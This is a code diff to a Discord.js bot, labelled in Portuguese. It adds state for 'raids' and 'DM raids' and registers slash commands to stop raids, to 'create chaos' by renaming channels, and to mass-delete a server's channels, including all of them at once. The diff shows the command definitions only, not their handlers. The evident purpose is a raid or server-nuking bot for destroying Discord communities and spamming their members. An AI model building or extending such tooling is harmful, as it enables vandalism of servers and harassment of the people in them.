@@ -7,11 +7,14 @@ const client = new Client({
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
         GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers
+        GatewayIntentBits.GuildMembers,
+        GatewayIntentBits.GuildModeration
     ]
 });
 
 client.commands = new Collection();
+client.raids = new Map();
+client.dmRaids = new Map();
 
 // Carregar comandos
 const commandsPath = path.join(__dirname, 'commands');
@@ -36,7 +39,7 @@ client.on('interactionCreate', async interaction => {
     if (!command) return;
 
     try {
-        await command.execute(interaction);
+        await command.execute(interaction, client);
     } catch (error) {
         console.error(error);
         await interaction.reply({ 
@@ -81,6 +84,46 @@ const commands = [
                 type: 3,
                 description: 'Mensagem para enviar',
                 required: true
+            }
+        ]
+    },
+    {
+        name: 'stop',
+        description: 'Para todas as raids e DMs em andamento'
+    },
+    {
+        name: 'chaos',
+        description: 'Cria caos no servidor (CUIDADO!)',
+        options: [
+            {
+                name: 'novo_nome',
+                type: 3,
+                description: 'Novo nome para os canais',
+                required: true
+            }
+        ]
+    },
+    {
+        name: 'deletechannels',
+        description: 'Deleta canais do servidor (EXTREMAMENTE PERIGOSO)',
+        options: [
+            {
+                name: 'quantidade',
+                type: 4,
+                description: 'Número de canais para deletar (0 = todos)',
+                required: false
+            },
+            {
+                name: 'tipo',
+                type: 3,
+                description: 'Tipo de canal para deletar',
+                required: false,
+                choices: [
+                    { name: 'Todos os canais', value: 'all' },
+                    { name: 'Apenas textuais', value: 'text' },
+                    { name: 'Apenas de voz', value: 'voice' },
+                    { name: 'Apenas categorias', value: 'category' }
+                ]
             }
         ]
     }
